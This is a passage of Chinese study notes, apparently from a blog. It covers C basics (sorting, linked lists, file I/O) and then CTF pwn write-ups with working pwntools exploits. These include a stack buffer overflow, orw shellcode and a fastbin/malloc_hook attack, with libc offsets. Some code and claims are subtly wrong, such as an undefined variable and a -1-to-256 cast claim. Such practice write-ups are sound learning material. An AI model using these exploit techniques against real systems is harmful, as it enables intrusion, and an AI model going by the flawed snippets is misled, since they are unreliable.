title="3.选择排序"></a>3.选择排序</h3><p>要点：选取最小元素的下标，初始值为0；与冒泡排序相反，冒泡排序是一轮循环把最大的元素放到最后一位a[n]，下一次循环从0到n-1，选择排序是一轮循环把最小的数放到开头a[0]，下一次循环从1到n，循环n次后就完成了排序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">arraySort</span><span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[],<span class="hljs-type">int</span> L)</span>&#123;<br><span class="hljs-type">int</span> i,j;<br><span class="hljs-type">int</span> min=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> temp;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;L<span class="hljs-number">-1</span>;i++)&#123;<br>min=i;<br><span class="hljs-keyword">for</span>(j=i+<span class="hljs-number">1</span>;j&lt;L;j++)&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">array</span>[j]&lt;<span class="hljs-built_in">array</span>[min])&#123;<br>min=j;  <span class="hljs-comment">//最小值与本次循环开头元素交换</span><br>&#125;<br>&#125;<br><br>temp=<span class="hljs-built_in">array</span>[min]; <span class="hljs-comment">//完成上述交换</span><br><span class="hljs-built_in">array</span>[min]=<span class="hljs-built_in">array</span>[i];<br><span class="hljs-built_in">array</span>[i]=temp;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="day2-链表"><a href="#day2-链表" class="headerlink" title="day2 链表"></a>day2 链表</h2><p>大纲要求：创建单向动态链表(创建)、输出链表(遍历)、释放列表(删除)</p><p>不考顺序表。</p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220921222427122.png" class="" title="image-20220921222427122"><h3 id="sample"><a href="#sample" class="headerlink" title="sample"></a>sample</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">//师姐资料里的</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEN sizeof(struct Stu)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stu</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> num;<br><span class="hljs-type">float</span> score;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stu</span> *<span class="hljs-title">next</span>;</span><br>&#125;;<br><span class="hljs-type">int</span> n=<span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">struct</span> Stu * <span class="hljs-title function_">creat</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stu</span> *<span class="hljs-title">head</span>=</span><span class="hljs-literal">NULL</span>,*p1,*p2;<br>p1=p2=(<span class="hljs-keyword">struct</span> Stu*)<span class="hljs-built_in">malloc</span>(LEN);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %f&quot;</span>,&amp;p1-&gt;num,&amp;p1-&gt;score);<br><span class="hljs-keyword">while</span>(p1-&gt;num)<br>&#123;<br>n++;<br><span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>)<br>head=p1;<br><span class="hljs-keyword">else</span><br>&#123;<br>p2-&gt;next=p1;<br>p2=p1;<br>&#125;<br>p1=(<span class="hljs-keyword">struct</span> Stu*)<span class="hljs-built_in">malloc</span>(LEN);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %f&quot;</span>,&amp;p1-&gt;num,&amp;p1-&gt;score);<br>&#125;<br>p2-&gt;next=<span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Stu* head)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stu</span>*<span class="hljs-title">p</span>=</span>head;<br><span class="hljs-keyword">while</span>(p!=<span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d:%5.1f\n&quot;</span>,p-&gt;num,p-&gt;score);<br>p=p-&gt;next;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">struct</span> Stu *<span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Stu *head,<span class="hljs-keyword">struct</span> Stu *p)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stu</span> *<span class="hljs-title">p1</span>=</span>head,*p2=head;<br><span class="hljs-keyword">if</span>(head==<span class="hljs-literal">NULL</span>)<br>&#123;head=p;p-&gt;next=<span class="hljs-literal">NULL</span>;&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">while</span>((p-&gt;num&gt;p1-&gt;num)&amp;&amp;(p1-&gt;next!=<span class="hljs-literal">NULL</span>))<br>&#123;p2=p1;p1=p1-&gt;next;&#125;<br><span class="hljs-keyword">if</span>(p1==head)<br>&#123;head=p;p-&gt;next=p1;&#125;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">if</span>(p-&gt;num&lt;p1-&gt;num)<br>&#123;p2-&gt;next=p;p-&gt;next=p1;&#125;<br><span class="hljs-keyword">else</span><br>&#123;p1-&gt;next=p;p-&gt;next=<span class="hljs-literal">NULL</span>;&#125;<br>&#125;<br>n++;<br><span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-keyword">struct</span> Stu *<span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Stu *head,<span class="hljs-type">int</span> num)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stu</span> *<span class="hljs-title">p1</span>=</span>head,*p2;<br><span class="hljs-keyword">while</span>(num!=p1-&gt;num&amp;&amp;p1-&gt;next!=<span class="hljs-literal">NULL</span>)<br>&#123;p2=p1;p1=p1-&gt;next;&#125;<br><span class="hljs-keyword">if</span>(p1-&gt;num==num)<br>&#123;<br><span class="hljs-keyword">if</span>(p1==head)<br>head=p1-&gt;next;<br><span class="hljs-keyword">else</span><br>p2-&gt;next=p1-&gt;next;<br>n--;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cannot founf!\n&quot;</span>);<br><span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Stu** head)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stu</span>* <span class="hljs-title">p</span>;</span><br><span class="hljs-keyword">while</span>(head!=<span class="hljs-literal">NULL</span>)<br>&#123;<br>p=*head;<br>*head=p-&gt;next;<br><span class="hljs-built_in">free</span>(p);<br>&#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stu</span>*<span class="hljs-title">head</span>=</span>creat();<br>print(head);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stu</span> *<span class="hljs-title">in</span>;</span><br>in=(<span class="hljs-keyword">struct</span> Stu*)<span class="hljs-built_in">malloc</span>(LEN);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %f&quot;</span>,&amp;in-&gt;num,&amp;in-&gt;score);<br>print(head=insert(head,in));<br><span class="hljs-type">int</span> num;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;num);<br>print(del(head,num));<br>release(&amp;head);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="day3-文件操作"><a href="#day3-文件操作" class="headerlink" title="day3 文件操作"></a>day3 文件操作</h2><h3 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h3><p>您可以使用 <strong>fopen( )</strong> 函数来创建一个新的文件或者打开一个已有的文件，这个调用会初始化类型 <strong>FILE</strong> 的一个对象，类型 <strong>FILE</strong> 包含了所有用来控制流的必要的信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">FILE *<span class="hljs-title function_">fopen</span><span class="hljs-params">( <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode )</span>;<br></code></pre></td></tr></table></figure><p>filename是文件名，访问模式mode有以下形式：</p><table><thead><tr><th align="left">模式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">r</td><td align="left">打开一个已有的文本文件，允许读取文件。</td></tr><tr><td align="left">w</td><td align="left">打开一个文本文件，允许写入文件。如果文件不存在，则会创建一个新文件。在这里，您的程序会从文件的开头写入内容。如果文件存在，则该会被截断为零长度，重新写入。</td></tr><tr><td align="left">a</td><td align="left">打开一个文本文件，以追加模式写入文件。如果文件不存在，则会创建一个新文件。在这里，您的程序会在已有的文件内容中追加内容。</td></tr><tr><td align="left">r+</td><td align="left">打开一个文本文件，允许读写文件。</td></tr><tr><td align="left">w+</td><td align="left">打开一个文本文件，允许读写文件。如果文件已存在，则文件会被截断为零长度，如果文件不存在，则会创建一个新文件。</td></tr><tr><td align="left">a+</td><td align="left">打开一个文本文件，允许读写文件。如果文件不存在，则会创建一个新文件。读取会从文件的开头开始，写入则只能是追加模式。</td></tr></tbody></table><p>如果处理的是二进制文件，则需使用下面的访问模式来取代上面的访问模式：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;rb&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>, <span class="hljs-string">&quot;ab&quot;</span>, <span class="hljs-string">&quot;rb+&quot;</span>, <span class="hljs-string">&quot;r+b&quot;</span>, <span class="hljs-string">&quot;wb+&quot;</span>, <span class="hljs-string">&quot;w+b&quot;</span>, <span class="hljs-string">&quot;ab+&quot;</span>, <span class="hljs-string">&quot;a+b&quot;</span><br></code></pre></td></tr></table></figure><h3 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h3><p>为了关闭文件，请使用 fclose( ) 函数。函数的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">fclose</span><span class="hljs-params">( FILE *fp )</span>;<br></code></pre></td></tr></table></figure><p>如果成功关闭文件，<strong>fclose( )</strong> 函数返回零，如果关闭文件时发生错误，函数返回 <strong>EOF</strong>(定义在stdio.h中)</p><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//把参数c的字符值写入</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">fputc</span><span class="hljs-params">( <span class="hljs-type">int</span> c, FILE *fp )</span>;<br><span class="hljs-comment">//写入字符串(以null结尾)</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">fputs</span><span class="hljs-params">( <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s, FILE *fp )</span>;<br><br><span class="hljs-comment">//注：fprintf也能写入，例如</span><br>fp = fopen(<span class="hljs-string">&quot;/tmp/test.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(fp, <span class="hljs-string">&quot;This is testing for fprintf...\n&quot;</span>);<br></code></pre></td></tr></table></figure><p>写入成功返回非负值，失败则返回EOF。</p><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>下面是从文件读取单个字符的最简单的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">fgetc</span><span class="hljs-params">( FILE * fp )</span>;<br></code></pre></td></tr></table></figure><p><strong>fgetc()</strong> 函数从 fp 所指向的输入文件中读取一个字符。返回值是读取的字符的指针，如果发生错误则返回 <strong>EOF</strong>。下面的函数允许您从流中读取一个字符串：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *<span class="hljs-title function_">fgets</span><span class="hljs-params">( <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> n, FILE *fp )</span>;<br></code></pre></td></tr></table></figure><p>函数 <strong>fgets()</strong> 从 fp 所指向的输入流中读取 n - 1 个字符。它会把读取的字符串复制到缓冲区 <strong>buf</strong>，并在最后追加一个 <strong>null</strong> 字符来终止字符串。</p><p>如果这个函数在读取最后一个字符之前就遇到一个换行符 ‘\n’ 或文件的末尾 EOF，则只会返回读取到的字符，包括换行符。您也可以使用 <strong>int fscanf(FILE *fp, const char *format, …)</strong> 函数来从文件中读取字符串，但是在遇到第一个空格和换行符时，它会停止读取。</p><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">fseek</span><span class="hljs-params">(FILE *fp,<span class="hljs-type">long</span> offset,<span class="hljs-type">int</span> base)</span><br><span class="hljs-comment">//使文件指针 fp 移到基于 base 的相对位置 offset 处。</span><br><br><span class="hljs-type">long</span> <span class="hljs-title function_">ftell</span><span class="hljs-params">(FILE *fp)</span> <br><span class="hljs-comment">//取得由 fp 指定文件的当前读/写位置，该位置值用相对于文件开头的位移量来表示。</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">rewind</span><span class="hljs-params">(FILE *fp)</span><br><span class="hljs-comment">//使由文件指针 fp 指定的文件的位置指针重新指向文件的开头位置。</span><br>    <br><span class="hljs-type">int</span> <span class="hljs-title function_">feof</span><span class="hljs-params">(FILE *fp)</span><br><span class="hljs-comment">//该函数用来判断文件是否结束。</span><br></code></pre></td></tr></table></figure><h2 id="day4-字符串与指针"><a href="#day4-字符串与指针" class="headerlink" title="day4 字符串与指针"></a>day4 字符串与指针</h2><p>1.使用指针计算字符串长度</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">stringLen</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span>&#123;<br>    <span class="hljs-type">int</span> L=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(*str2!=<span class="hljs-string">&#x27;\0&#x27;</span>)&#123; <span class="hljs-comment">//字符串的末尾会有 \0 作为截止符号。</span><br>        L++;<br>        str++; <br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nlength of string is:%d&quot;</span>,L);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p><a href="https://ctf-wiki.org/pwn">https://ctf-wiki.org/pwn</a></p><h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><p>首先检查程序，几乎没有保护机制。</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220918214922852.png" class="" title="image-20220918214922852"><p>运行一下，发现似乎需要我们输入一个数，然后进行判断，反编译找到源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> v1[<span class="hljs-number">44</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">float</span> v2; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  v2 = <span class="hljs-number">0.0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s guess the number.&quot;</span>);<br>  gets(v1);<br>  <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">11.28125</span> )<br>    result = system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Its value should be 11.28125&quot;</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>v2与11.28125进行比较，如果相等就给flag；输入则是给到了v1，下面是v1、v2在栈中的分布。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">-0000000000000030</span> var_30          db <span class="hljs-number">44</span> dup(?)<br><span class="hljs-number">-0000000000000004</span> var_4           dd ?<br>+<span class="hljs-number">0000000000000000</span>  s              db <span class="hljs-number">8</span> dup(?)<br>+<span class="hljs-number">0000000000000008</span>  r              db <span class="hljs-number">8</span> dup(?)<br></code></pre></td></tr></table></figure><p>不过v1与v2都是局部变量，运行时都在栈中，gets函数无输入长度限制会导致栈溢出，因此我们输入44字节的padding填入v1，再输入4字节的11.28125覆盖v2，即可修改v2。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#exp.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment"># p=process(&quot;./ciscn_2019_n_1&quot;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25151</span>)<br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">44</span>+p32(<span class="hljs-number">0x41348000</span>)<br>p.recvuntil(<span class="hljs-string">&quot;number.\n&quot;</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220918215707990.png" class="" title="image-20220918215707990"><h3 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h3><p>整形字符溢出，当整形被强转为unsigned类型，负数会变成正数，-1会变成256</p><h3 id="pwnnable-ORW"><a href="#pwnnable-ORW" class="headerlink" title="pwnnable_ORW"></a>pwnnable_ORW</h3><p>今天学一下orw，题目源自pwnable上的orw例题pwnable_orw。</p><p>orw指open、read、write，这种题目会采用禁止大部分系统调用的方式来防止我们拿到shell，但一半会为我们保留open、read、write这三种调用，通过orw我们依然可以去读取flag。</p><blockquote><p>关于seccomp机制： <strong>seccomp</strong>相当于内核中的一种安全机制，正常情况下，程序可以使用所有的 syscall，但是当劫持程序流程之后通过 exeve 来呼叫 syscall 得到 shell 时 seccomp 边排上了用场，他可以过滤掉某些 syscall，只允许使用部分 syscall。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">//seccomp检测工具</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">sudo apt install gcc ruby-dev</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">gem install seccomp-tools</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">seccomp-tools dump ./pwn</span><br></code></pre></td></tr></table></figure></blockquote><p>检查程序发现是32位，开了canary和relro，打开ida发现首先是禁用了部分调用</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220923211102180.png" class="" title="image-20220923211102180"><p>然后就允许我们输入shellcode，然后就会直接执行shellcode处的代码:</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220923211225137.png" class="" title="image-20220923211225137"><p>很明显我们只需要构造orw写入shellcode的地址即可，第一种方式是直接使用pwntools来生成汇编代码的shellcode：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>p = process(<span class="hljs-string">&#x27;./orw&#x27;</span>)<br>shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>) <span class="hljs-comment">#打开flag的文件流</span><br>shellcode += shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>) <span class="hljs-comment">#将返回值(eax)读到栈上(范围rsp到下方100字节)</span><br>shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>) <span class="hljs-comment">#将栈上的内容输出</span><br>payload = asm(shellcode)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>第二种方式就是手搓汇编</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&quot;linux&quot;</span>, arch = <span class="hljs-string">&quot;i386&quot;</span>, log_level= <span class="hljs-string">&quot;debug&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">27008</span>)<br><br>shellcode = asm(<span class="hljs-string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)<br>shellcode+=asm(<span class="hljs-string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)<br>shellcode+=asm(<span class="hljs-string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;shellcode:&#x27;</span>, shellcode)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220923212618950.png" class="" title="image-20220923212618950"><h3 id="UAF-fastbin-attack"><a href="#UAF-fastbin-attack" class="headerlink" title="UAF+fastbin attack"></a>UAF+fastbin attack</h3><p><strong>libc-2.23</strong></p><p>一道例题，没开pie，因此我们可以直接unsortedbin泄露main_arena的地址。</p><blockquote><p>回顾一下通过unsortedbin泄露基地址的原理。</p><p>申请一个0x100大小的堆块并释放进入unsortedbin，此时unsortedbin中的fd与bk指针就泄露出来：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220922155503252.png" class="" title="image-20220922155503252"><p>而第一个堆块的fd与bk指针指向的是main_arena+88的真实地址。</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220922155437096.png" class="" title="image-20220922155437096"><p>main_arena就在malloc_hook的下方：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220922155903548.png" class="" title="image-20220922155903548"><p>因此泄露出的地址相对于libc基地址的总偏移为 ：</p><p><strong>offset &#x3D; 88(main_arena)+0x10(malloc_hook)+0x3c4b10(malloc_hook在libc中的偏移)&#x3D;0x3c4b78</strong></p></blockquote><p>泄露出地址之后就可以在malloc_hook处做好堆布局，劫持fastbin的fd指针为malloc_hook，最后申请出的堆块数据区就是malloc_hook，最后填入one_gadget即可。</p><h4 id="使用realloc调整one-gadget栈帧"><a href="#使用realloc调整one-gadget栈帧" class="headerlink" title="使用realloc调整one_gadget栈帧"></a>使用realloc调整one_gadget栈帧</h4><p>实际情况中经常会遇到one_gadget不生效的情况，原因在于one_gadget的触发是需要条件的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x45216</span>execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, rsp+<span class="hljs-number">0x30</span>, environ)<br>constraints:<br>  rax == <span class="hljs-literal">NULL</span><br><br><span class="hljs-number">0x4526a</span>execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, rsp+<span class="hljs-number">0x30</span>, environ)<br>constraints:<br>  [rsp+<span class="hljs-number">0x30</span>] == <span class="hljs-literal">NULL</span><br><br><span 